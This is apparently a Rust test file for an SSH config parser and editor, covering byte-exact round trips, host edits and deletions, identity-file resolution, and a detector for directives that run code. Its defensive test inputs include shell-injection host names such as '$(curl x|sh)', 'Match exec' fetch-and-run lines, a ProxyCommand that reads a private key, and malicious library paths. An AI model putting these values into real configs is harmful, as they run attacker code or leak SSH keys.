use std::fs;

use super::*;
use crate::ErrorCode;

const TRICKY: &str = "\
# Global settings
AddKeysToAgent yes
IdentityFile ~/.ssh/global_key
Include config.d/*  ~/.ssh/extra.conf

Host github.com gh
\tHostName github.com
\tUser git
\tIdentityFile=~/.ssh/github
\t# keep this comment
\tIdentityFile \"~/.ssh/my key\"

# Work servers
Host work-*  !work-legacy
  HostName = %h.corp.example.com\x20\x20\x20
  Port 2222
  ProxyJump bastion # inline comment
  ProxyCommand ssh -W %h:%p jump # literal hash

Match host *.internal exec \"test -f /tmp/x\"
  ForwardAgent no

Host Ünïcode-хост
    User пользователь

host *
    ServerAliveInterval 60";

fn tricky() -> SshConfig {
    SshConfig::parse(TRICKY)
}

fn opt(key: &str, value: &str) -> HostOption {
    HostOption::new(key, value)
}

fn edit(id: Option<u32>, patterns: &[&str], options: &[(&str, &str)]) -> HostEdit {
    HostEdit {
        id,
        patterns: patterns.iter().map(|p| (*p).to_owned()).collect(),
        options: options.iter().map(|(k, v)| opt(k, v)).collect(),
    }
}

#[test]
fn round_trips_byte_for_byte() {
    let inputs = [
        TRICKY.to_owned(),
        TRICKY.replace('\n', "\r\n"),
        format!("{TRICKY}\n"),
        String::new(),
        "\n\n\n".into(),
        "\u{feff}Host bom\n  User x\n".into(),
        "Host a\n\tUser b   \t\n# tail comment".into(),
        "=broken\nHost\nUser \"open quote\n".into(),
        "Host x\r\n  User y\n  Port 1\r\n".into(),
    ];
    for input in &inputs {
        assert_eq!(SshConfig::parse(input).to_string(), *input);
    }
}

#[test]
fn read_view() {
    let config = tricky();
    let hosts = config.hosts();
    assert_eq!(hosts.len(), 5);

    let gh = &hosts[0];
    assert_eq!(gh.id, 0);
    assert_eq!(gh.kind, HostKind::Host);
    assert_eq!(gh.patterns, ["github.com", "gh"]);
    assert_eq!(gh.host_name.as_deref(), Some("github.com"));
    assert_eq!(gh.user.as_deref(), Some("git"));
    assert_eq!(gh.identity_files, ["~/.ssh/github", "~/.ssh/my key"]);
    assert!(!gh.is_wildcard);
    assert_eq!((gh.line_start, gh.line_end), (6, 11));

    let work = &hosts[1];
    assert_eq!(work.patterns, ["work-*", "!work-legacy"]);
    assert!(work.is_wildcard);
    assert_eq!(work.host_name.as_deref(), Some("%h.corp.example.com"));
    assert_eq!(work.port, Some(2222));
    assert_eq!(work.proxy_jump.as_deref(), Some("bastion"));
    let proxy = work
        .options
        .iter()
        .find(|o| o.key == "ProxyCommand")
        .unwrap();
    assert_eq!(proxy.value, "ssh -W %h:%p jump # literal hash");

    let m = &hosts[2];
    assert_eq!(m.kind, HostKind::Match);
    assert_eq!(m.patterns, Vec::<String>::new());
    assert_eq!(
        m.criteria.as_deref(),
        Some("host *.internal exec \"test -f /tmp/x\"")
    );

    assert_eq!(hosts[3].patterns, ["Ünïcode-хост"]);
    assert_eq!(hosts[3].user.as_deref(), Some("пользователь"));
    assert!(hosts[4].is_wildcard);
    assert_eq!(hosts[4].line_end, 27);

    assert_eq!(
        config.global_options(),
        [
            opt("AddKeysToAgent", "yes"),
            opt("IdentityFile", "~/.ssh/global_key"),
            opt("Include", "config.d/*  ~/.ssh/extra.conf"),
        ]
    );
    assert_eq!(config.includes(), ["config.d/*", "~/.ssh/extra.conf"]);
    assert_eq!(config.issues(), []);
    assert_eq!(config.host(1).unwrap(), hosts[1]);
    assert!(config.host(99).is_none());
}

#[test]
fn reports_issues_without_losing_lines() {
    let input = "=x\nHost\nUser \"open\n";
    let config = SshConfig::parse(input);
    let kinds: Vec<_> = config
        .issues()
        .into_iter()
        .map(|i| (i.line, i.kind))
        .collect();
    assert_eq!(
        kinds,
        [
            (1, ConfigIssueKind::MissingKeyword),
            (2, ConfigIssueKind::MissingValue),
            (3, ConfigIssueKind::UnterminatedQuote),
        ]
    );
    assert_eq!(config.to_string(), input);
}

#[test]
fn update_in_place_keeps_layout() {
    let mut config = tricky();
    let id = config
        .upsert_host(&edit(
            Some(1),
            &["work-*", "!work-legacy"],
            &[
                ("hostname", "%h.example.net"),
                ("Port", "2222"),
                ("ProxyJump", "bastion2"),
                ("ProxyCommand", "ssh -W %h:%p jump # literal hash"),
            ],
        ))
        .unwrap();
    assert_eq!(id, 1);
    let out = config.to_string();
    let expected = TRICKY
        .replace(
            "  HostName = %h.corp.example.com\x20\x20\x20\n",
            "  HostName = %h.example.net\n",
        )
        .replace(
            "  ProxyJump bastion # inline comment",
            "  ProxyJump bastion2 # inline comment",
        );
    assert_eq!(out, expected);
}

#[test]
fn update_removes_and_appends_with_block_indent() {
    let mut config = tricky();
    config
        .upsert_host(&edit(
            Some(0),
            &["github.com", "gh"],
            &[
                ("HostName", "github.com"),
                ("IdentityFile", "~/.ssh/github"),
                ("IdentityFile", "~/.ssh/another key"),
                ("IdentitiesOnly", "yes"),
            ],
        ))
        .unwrap();
    let out = config.to_string();
    let expected = TRICKY.replace(
        "\tUser git\n\tIdentityFile=~/.ssh/github\n\t# keep this comment\n\tIdentityFile \"~/.ssh/my key\"\n",
        "\tIdentityFile=~/.ssh/github\n\t# keep this comment\n\tIdentityFile \"~/.ssh/another key\"\n\tIdentitiesOnly yes\n",
    );
    assert_eq!(out, expected);
    let gh = config.host(0).unwrap();
    assert_eq!(gh.identity_files, ["~/.ssh/github", "~/.ssh/another key"]);
    assert_eq!(gh.user, None);
}

#[test]
fn update_patterns_and_unchanged_values_are_untouched() {
    let mut config = tricky();
    // Same values (including the quoted one) → no change at all.
    let same = config.host(0).unwrap();
    config
        .upsert_host(&HostEdit {
            id: Some(0),
            patterns: same.patterns.clone(),
            options: same.options.clone(),
        })
        .unwrap();
    assert_eq!(config.to_string(), TRICKY);

    config
        .upsert_host(&HostEdit {
            id: Some(0),
            patterns: vec!["github.com".into()],
            options: same.options,
        })
        .unwrap();
    assert!(
        config
            .to_string()
            .contains("\nHost github.com\n\tHostName github.com\n")
    );
}

#[test]
fn new_host_goes_before_trailing_host_star() {
    let mut config = tricky();
    let id = config
        .upsert_host(&edit(
            None,
            &["new"],
            &[("HostName", "10.0.0.1"), ("IdentityFile", "~/.ssh/new key")],
        ))
        .unwrap();
    assert_eq!(id, 4);
    let out = config.to_string();
    let expected = TRICKY.replace(
        "\nhost *\n",
        "\nHost new\n\tHostName 10.0.0.1\n\tIdentityFile \"~/.ssh/new key\"\n\nhost *\n",
    );
    assert_eq!(out, expected);
    assert_eq!(config.host(5).unwrap().patterns, ["*"]);
}

#[test]
fn new_host_with_comment_above_host_star() {
    let mut config = SshConfig::parse("Host a\n  User x\n# defaults\nHost *\n  User y\n");
    config
        .upsert_host(&edit(None, &["b"], &[("User", "z")]))
        .unwrap();
    assert_eq!(
        config.to_string(),
        "Host a\n  User x\n\nHost b\n  User z\n\n# defaults\nHost *\n  User y\n"
    );
}

#[test]
fn new_host_appended_and_separated() {
    let mut config = SshConfig::parse("Host a\n  User x");
    config
        .upsert_host(&edit(None, &["b"], &[("Port", "22")]))
        .unwrap();
    // The missing final newline is preserved.
    assert_eq!(config.to_string(), "Host a\n  User x\n\nHost b\n  Port 22");

    let mut empty = SshConfig::default();
    assert_eq!(
        empty
            .upsert_host(&edit(None, &["only"], &[("User", "me")]))
            .unwrap(),
        0
    );
    assert_eq!(empty.to_string(), "Host only\n    User me\n");

    let mut crlf = SshConfig::parse("Host a\r\n\tUser x\r\n\r\n");
    crlf.upsert_host(&edit(None, &["b"], &[("User", "y")]))
        .unwrap();
    assert_eq!(
        crlf.to_string(),
        "Host a\r\n\tUser x\r\n\r\nHost b\r\n\tUser y\r\n"
    );
}

#[test]
fn edits_are_trimmed() {
    let mut config = SshConfig::default();
    config
        .upsert_host(&edit(
            None,
            &[" spaced "],
            &[(" User ", "  me  "), ("IdentityFile", " \"~/a b\" ")],
        ))
        .unwrap();
    assert_eq!(
        config.to_string(),
        "Host spaced\n    User me\n    IdentityFile \"~/a b\"\n"
    );
    assert_eq!(config.host(0).unwrap().identity_files, ["~/a b"]);
}

#[test]
fn append_option_to_last_line_without_newline() {
    let mut config = SshConfig::parse("Host a\n  User x");
    config
        .upsert_host(&edit(Some(0), &["a"], &[("User", "x"), ("Port", "2")]))
        .unwrap();
    assert_eq!(config.to_string(), "Host a\n  User x\n  Port 2");
}

#[test]
fn delete_host_with_attached_comments() {
    let mut config = tricky();
    config.delete_host(1).unwrap();
    let out = config.to_string();
    assert!(!out.contains("Work servers"));
    assert!(!out.contains("work-*"));
    assert!(out.contains("\tIdentityFile \"~/.ssh/my key\"\n\nMatch host"));
    assert_eq!(config.hosts().len(), 4);

    // Deleting the last block leaves no trailing blank lines and keeps the
    // missing final newline.
    let mut config = tricky();
    config.delete_host(4).unwrap();
    assert!(config.to_string().ends_with("    User пользователь"));

    let mut config = SshConfig::parse("User me\n\nHost a\n  X 1\n");
    config.delete_host(0).unwrap();
    assert_eq!(config.to_string(), "User me\n");

    let mut config = SshConfig::parse("Host a\n  X 1\n\n# about b\nHost b\n  X 2\n\nHost c\n");
    config.delete_host(1).unwrap();
    assert_eq!(config.to_string(), "Host a\n  X 1\n\nHost c\n");

    // Match blocks can be deleted.
    let mut config = tricky();
    config.delete_host(2).unwrap();
    assert!(!config.to_string().contains("Match"));

    assert_eq!(
        config.delete_host(42).unwrap_err().code(),
        ErrorCode::NotFound
    );
}

#[test]
fn rejects_invalid_edits() {
    let mut config = tricky();
    let cases = [
        edit(None, &[], &[]),
        edit(None, &[""], &[]),
        edit(None, &["two words"], &[]),
        edit(None, &["#x"], &[]),
        edit(None, &["ok"], &[("User", "a\nb")]),
        edit(None, &["ok"], &[("User", "  ")]),
        edit(None, &["ok"], &[("Bad Key", "x")]),
        edit(None, &["ok"], &[("Host", "x")]),
        edit(None, &["ok"], &[("", "x")]),
    ];
    for case in &cases {
        assert_eq!(
            config.upsert_host(case).unwrap_err().code(),
            ErrorCode::InvalidInput,
            "{case:?}"
        );
    }
    assert_eq!(
        config
            .upsert_host(&edit(Some(2), &["x"], &[]))
            .unwrap_err()
            .code(),
        ErrorCode::Unsupported
    );
    assert_eq!(
        config
            .upsert_host(&edit(Some(77), &["x"], &[]))
            .unwrap_err()
            .code(),
        ErrorCode::NotFound
    );
    assert_eq!(config.to_string(), TRICKY);
}

#[test]
fn remove_identity_file() {
    let mut config = tricky();
    assert!(
        config
            .remove_identity_file(Some(0), "~/.ssh/my key")
            .unwrap()
    );
    assert!(
        !config
            .remove_identity_file(Some(0), "~/.ssh/my key")
            .unwrap()
    );
    assert_eq!(config.host(0).unwrap().identity_files, ["~/.ssh/github"]);
    assert!(
        config
            .remove_identity_file(None, "~/.ssh/global_key")
            .unwrap()
    );
    assert!(!config.to_string().contains("global_key"));
}

#[test]
fn identity_usage_expands_paths() {
    let home = tempfile::tempdir().unwrap();
    let ssh = home.path().join(".ssh");
    fs::create_dir(&ssh).unwrap();
    fs::write(ssh.join("github"), "k").unwrap();
    fs::write(ssh.join("agent_only.pub"), "k").unwrap();
    let paths = SshPaths::with_home(home.path(), &ssh);
    let config = SshConfig::parse(
        "IdentityFile ~/.ssh/global\n\
         Host gh\n  HostName github.com\n  IdentityFile ~/.ssh/github\n  IdentityFile %d/.ssh/agent_only\n  IdentityFile ~/.ssh/id_%h\n  IdentityFile relative/key\n  IdentityFile none\n\
         Host *\n  IdentityFile ~/.ssh/%C\n",
    );
    let usage = config.identity_usage(&paths);
    let show: Vec<_> = usage
        .iter()
        .map(|u| (u.host_id, u.raw.as_str(), u.resolved, u.exists))
        .collect();
    assert_eq!(
        show,
        [
            (None, "~/.ssh/global", true, false),
            (Some(0), "~/.ssh/github", true, true),
            (Some(0), "%d/.ssh/agent_only", true, true),
            (Some(0), "~/.ssh/id_%h", true, false),
            (Some(0), "relative/key", false, false),
            (Some(1), "~/.ssh/%C", false, false),
        ]
    );
    assert_eq!(usage[1].path, path_string(&ssh.join("github")));
    assert_eq!(usage[3].path, path_string(&ssh.join("id_github.com")));
    assert_eq!(usage[1].patterns, ["gh"]);
    assert!(usage.iter().all(|u| !u.remote));
}

#[test]
fn remote_identity_paths() {
    for remote in [
        r"\\evil\share\k",
        "//evil/share/k",
        r"\/evil\share",
        r"\\?\UNC\evil\share\k",
        r"\\.\pipe\x",
        r"\\?\GLOBALROOT\Device\Mup\evil\share",
    ] {
        assert!(is_remote_path(remote), "{remote}");
    }
    for local in [
        r"C:\Users\me\.ssh\id",
        "/home/me/.ssh/id",
        r"\Users\me",
        "~/.ssh/id",
        "",
    ] {
        assert!(!is_remote_path(local), "{local}");
    }
    // On Windows such a path is never looked at (that would connect to the
    // server); elsewhere `//x` is an ordinary local path.
    let home = tempfile::tempdir().unwrap();
    let paths = SshPaths::with_home(home.path(), home.path().join(".ssh"));
    let usage = SshConfig::parse("Host x\n  IdentityFile //evil/share/k\n").identity_usage(&paths);
    assert_eq!(usage[0].remote, cfg!(windows));
    assert_eq!(usage[0].resolved, !cfg!(windows));
    assert!(!usage[0].exists);
}

/// Block, keyword and value of a directive that runs code.
type Found = (Option<String>, String, String);

/// Nothing to confirm.
const NOTHING: [String; 0] = [];

fn risky(config: &str) -> Vec<Found> {
    SshConfig::parse(config)
        .risky_directives()
        .into_iter()
        .map(|d| (d.block, d.key, d.value))
        .collect()
}

fn added(before: &str, after: &str) -> Vec<String> {
    SshConfig::parse(after)
        .added_risky_directives(&SshConfig::parse(before))
        .into_iter()
        .map(|d| format!("{} | {} {}", d.block.unwrap_or_default(), d.key, d.value))
        .collect()
}

#[test]
fn finds_directives_that_run_code() {
    let found = risky(
        "ProxyCommand nc %h %p\n\
         Include ~/.ssh/config.d/*\n\
         Host a b\n\
         \tProxyCommand=ssh -W %h:%p jump # all of it\n\
         \tLocalCommand none\n\
         \tPermitLocalCommand yes\n\
         \tKnownHostsCommand /bin/kh %H\n\
         \tPKCS11Provider /usr/lib/opensc-pkcs11.so\n\
         \tSecurityKeyProvider internal\n\
         \tSecurityKeyProvider /tmp/evil.dylib\n\
         \tIdentityAgent SSH_AUTH_SOCK\n\
         \tIdentityAgent ~/.1password/agent.sock\n\
         \tForwardAgent no\n\
         \tforwardagent yes\n\
         \tForwardX11Trusted yes\n\
         \tXAuthLocation /opt/X11/bin/xauth\n\
         \tRemoteCommand tmux attach\n\
         \tUser me\n\
         Match host *.internal !exec \"test -f /tmp/x\"\n\
         \tProxyCommand none\n\
         \tProxyCommand \"none\"\n\
         Match all\n\
         \tForwardX11 no\n",
    );
    let host = Some("Host a b".to_owned());
    let matched = Some("Match host *.internal !exec \"test -f /tmp/x\"".to_owned());
    let s = |block: &Option<String>, key: &str, value: &str| {
        (block.clone(), key.to_owned(), value.to_owned())
    };
    assert_eq!(
        found,
        [
            s(&None, "ProxyCommand", "nc %h %p"),
            s(&None, "Include", "~/.ssh/config.d/*"),
            s(&host, "ProxyCommand", "ssh -W %h:%p jump # all of it"),
            s(&host, "PermitLocalCommand", "yes"),
            s(&host, "KnownHostsCommand", "/bin/kh %H"),
            s(&host, "PKCS11Provider", "/usr/lib/opensc-pkcs11.so"),
            s(&host, "SecurityKeyProvider", "/tmp/evil.dylib"),
            s(&host, "IdentityAgent", "~/.1password/agent.sock"),
            s(&host, "forwardagent", "yes"),
            s(&host, "ForwardX11Trusted", "yes"),
            s(&host, "XAuthLocation", "/opt/X11/bin/xauth"),
            s(
                &matched,
                "Match",
                "host *.internal !exec \"test -f /tmp/x\""
            ),
            // OpenSSH takes the rest of the line literally: a program `"none"`.
            s(&matched, "ProxyCommand", "\"none\""),
        ]
    );
    assert_eq!(
        risky("Match Exec=\"x\"\nMatch host ex\"ec\"\nHost exec\n"),
        [
            s(&Some("Match Exec=\"x\"".into()), "Match", "Exec=\"x\""),
            s(
                &Some("Match host ex\"ec\"".into()),
                "Match",
                "host ex\"ec\""
            ),
        ]
    );
    assert_eq!(risky(TRICKY_WITHOUT_COMMANDS), Vec::<Found>::new());
}

#[test]
fn every_spelling_ssh_accepts_counts() {
    // `ssh -G` reads all of these keywords: quoted, after `=`, in any case.
    let found: Vec<String> = risky(
        "\"ProxyCommand\" echo hi\n\
         Proxy\"Command\" echo hi\n\
         =ProxyCommand echo hi\n\
         \"Match\" exec true\n\
         SmartcardDevice /tmp/evil.so\n\
         RemoteForward /tmp/a.sock ${SSH_AUTH_SOCK}\n\
         RemoteForward 2375 /var/run/docker.sock\n\
         RemoteForward 1080\n\
         RemoteForward 8080 localhost:3000\n\
         \"HostName\" example.com\n",
    )
    .into_iter()
    .map(|(_, key, value)| format!("{key} {value}"))
    .collect();
    assert_eq!(
        found,
        [
            "\"ProxyCommand\" echo hi",
            "Proxy\"Command\" echo hi",
            " ProxyCommand echo hi",
            "\"Match\" exec true",
            "SmartcardDevice /tmp/evil.so",
            "RemoteForward /tmp/a.sock ${SSH_AUTH_SOCK}",
            "RemoteForward 2375 /var/run/docker.sock",
            "RemoteForward 1080",
        ]
    );
}

#[test]
fn names_with_shell_syntax_count_as_code() {
    // `%h` in an existing ProxyCommand would run what HostName holds.
    let found: Vec<String> = risky(
        "Host plain web-* !old ?x [::1] Ünïcode-хост\n\
         \tHostName %h.corp.example.com\n\
         \tUser DOMAIN\\me\n\
         \tProxyJump admin@bastion:2222,ssh://jump.example\n\
         \tHostKeyAlias box\n\
         Host evil;id\n\
         \tHostName $(curl x|sh)\n\
         \tUser \"me `id`\"\n\
         \tProxyJump a&b\n\
         \tHostKeyAlias 'a b'\n",
    )
    .into_iter()
    .map(|(_, key, value)| format!("{key} {value}"))
    .collect();
    assert_eq!(
        found,
        [
            "Host evil;id",
            "HostName $(curl x|sh)",
            "User \"me `id`\"",
            "ProxyJump a&b",
            "HostKeyAlias 'a b'",
        ]
    );
    // Renaming a host to such a name asks; plain names do not.
    assert_eq!(
        added("Host a\n", "Host a$(id)\n"),
        ["Host a$(id) | Host a$(id)"]
    );
    assert_eq!(
        added("Host a\n", "Host a b-1\n  HostName b.example\n"),
        NOTHING
    );
}

const TRICKY_WITHOUT_COMMANDS: &str = "\
Host github.com\n  HostName github.com\n  User git\n  IdentityFile ~/.ssh/github\n\
Host *\n  ForwardAgent no\n  ProxyJump bastion\n  LocalForward 8080 localhost:80\n";

#[test]
fn reports_only_added_or_changed_directives() {
    let base = "\
Host a\n  ProxyCommand ssh -W %h:%p jump\n  User me\n\
Host b\n  HostName b.example\n";
    // Editing something else, reordering or removing asks nothing.
    assert_eq!(added(base, base), NOTHING);
    assert_eq!(added(base, &base.replace("User me", "User you")), NOTHING);
    assert_eq!(
        added(
            base,
            "Host a\n  User me\n  ProxyCommand ssh -W %h:%p jump\nHost b\n  Port 2\n"
        ),
        NOTHING
    );
    assert_eq!(added(base, "Host b\n  HostName b.example\n"), NOTHING);
    // Re-quoting a header or changing the keyword's case is the same block.
    assert_eq!(
        added(
            base,
            &base.replace("Host a\n  ProxyCommand", "host \"a\"\n  proxycommand")
        ),
        NOTHING
    );

    // New, changed, copied to another block, or a renamed block.
    assert_eq!(
        added(base, &format!("{base}  ProxyCommand evil\n")),
        ["Host b | ProxyCommand evil"]
    );
    assert_eq!(
        added(base, &base.replace("jump", "jump2")),
        ["Host a | ProxyCommand ssh -W %h:%p jump2"]
    );
    assert_eq!(
        added(base, &base.replace("Host a", "Host a2")),
        ["Host a2 | ProxyCommand ssh -W %h:%p jump"]
    );
    assert_eq!(
        added(base, &format!("ProxyCommand ssh -W %h:%p jump\n{base}")),
        [" | ProxyCommand ssh -W %h:%p jump"]
    );
    // A second copy in the same block counts too.
    assert_eq!(
        added(
            base,
            &base.replace("User me", "User me\n  ProxyCommand ssh -W %h:%p jump")
        ),
        ["Host a | ProxyCommand ssh -W %h:%p jump"]
    );
    // From a file that did not exist (or could not be read): everything.
    assert_eq!(added("", base), ["Host a | ProxyCommand ssh -W %h:%p jump"]);
    assert_eq!(
        added("", "Match exec \"curl x | sh\"\n"),
        ["Match exec \"curl x | sh\" | Match exec \"curl x | sh\""]
    );
}

#[test]
fn upsert_adds_risky_options_visibly() {
    let before = tricky();
    let mut after = before.clone();
    let id = after
        .upsert_host(&edit(
            Some(0),
            &["github.com", "gh"],
            &[
                ("HostName", "github.com"),
                ("User", "git"),
                ("IdentityFile", "~/.ssh/github"),
                ("IdentityFile", "~/.ssh/my key"),
                ("ProxyCommand", "sh -c 'cat ~/.ssh/id_ed25519 >&2'"),
            ],
        ))
        .unwrap();
    assert_eq!(id, 0);
    let added = after.added_risky_directives(&before);
    assert_eq!(added.len(), 1);
    assert_eq!(added[0].block.as_deref(), Some("Host github.com gh"));
    assert_eq!(added[0].value, "sh -c 'cat ~/.ssh/id_ed25519 >&2'");
    // Editing another block of the same file asks nothing, even though the
    // file has a ProxyCommand and a Match exec.
    let mut other = before.clone();
    other
        .upsert_host(&edit(Some(4), &["*"], &[("ServerAliveInterval", "30")]))
        .unwrap();
    assert_eq!(other.added_risky_directives(&before), []);
}

#[test]
fn revision_is_the_hash_of_the_file() {
    let home = tempfile::tempdir().unwrap();
    let path = home.path().join("config");
    assert_eq!(
        SshConfig::load(&path).unwrap().revision(),
        fsutil::revision(b"")
    );
    fs::write(&path, TRICKY).unwrap();
    let config = SshConfig::load(&path).unwrap();
    assert_eq!(config.revision(), fsutil::revision(TRICKY.as_bytes()));
    assert_eq!(config.view().revision, config.revision());
    let mut edited = config.clone();
    edited.delete_host(0).unwrap();
    assert_ne!(edited.revision(), config.revision());
}

#[test]
fn load_and_save() {
    let home = tempfile::tempdir().unwrap();
    let path = home.path().join(".ssh").join("config");
    let backups = home.path().join("backups");
    let mut config = SshConfig::load(&path).unwrap();
    assert_eq!(config, SshConfig::default());
    config
        .upsert_host(&edit(None, &["a"], &[("User", "u")]))
        .unwrap();
    assert_eq!(config.save(&path, &backups).unwrap(), None);
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        assert_eq!(
            fs::metadata(&path).unwrap().permissions().mode() & 0o777,
            0o600
        );
        fs::set_permissions(&path, fs::Permissions::from_mode(0o644)).unwrap();
    }
    let mut again = SshConfig::load(&path).unwrap();
    again
        .upsert_host(&edit(None, &["b"], &[("User", "v")]))
        .unwrap();
    let backup = again.save(&path, &backups).unwrap().unwrap();
    assert_eq!(fs::read_to_string(backup).unwrap(), "Host a\n    User u\n");
    assert_eq!(SshConfig::load(&path).unwrap(), again);
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        assert_eq!(
            fs::metadata(&path).unwrap().permissions().mode() & 0o777,
            0o644
        );
    }

    fs::write(&path, b"Host \xff\n").unwrap();
    assert_eq!(SshConfig::load(&path).unwrap_err().code(), ErrorCode::Parse);
}

#[test]
fn view_serializes_camel_case() {
    let v = serde_json::to_value(tricky().view()).unwrap();
    assert_eq!(v["hosts"][0]["hostName"], "github.com");
    assert_eq!(v["hosts"][2]["kind"], "match");
    assert_eq!(v["hosts"][0]["identityFiles"][1], "~/.ssh/my key");
    assert_eq!(v["globalOptions"][0]["key"], "AddKeysToAgent");
    let e: HostEdit = serde_json::from_str(
        r#"{"id":null,"patterns":["x"],"options":[{"key":"User","value":"me"}]}"#,
    )
    .unwrap();
    assert_eq!(e.options[0], opt("User", "me"));
}

/// Checks that OpenSSH itself parses edited output as intended. Uses only the
/// temporary file (`ssh -G -F <file>` does not connect or read ~/.ssh/config).
#[test]
#[ignore = "needs the ssh binary"]
fn openssh_accepts_edited_config() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("config");
    let mut config = tricky();
    config
        .upsert_host(&edit(
            None,
            &["edited"],
            &[
                ("HostName", "edited.example.com"),
                ("User", "deploy"),
                ("Port", "2200"),
                ("IdentityFile", "/tmp/dir with space/key"),
            ],
        ))
        .unwrap();
    fs::write(&path, config.to_string()).unwrap();
    let out = std::process::Command::new("ssh")
        .arg("-G")
        .arg("-F")
        .arg(&path)
        .arg("edited")
        .output()
        .unwrap();
    let stdout = String::from_utf8_lossy(&out.stdout);
    assert!(
        out.status.success(),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(stdout.contains("hostname edited.example.com"));
    assert!(stdout.contains("user deploy"));
    assert!(stdout.contains("port 2200"));
    assert!(
        stdout.contains("identityfile /tmp/dir with space/key"),
        "{stdout}"
    );
    assert!(stdout.contains("serveraliveinterval 60"));
}
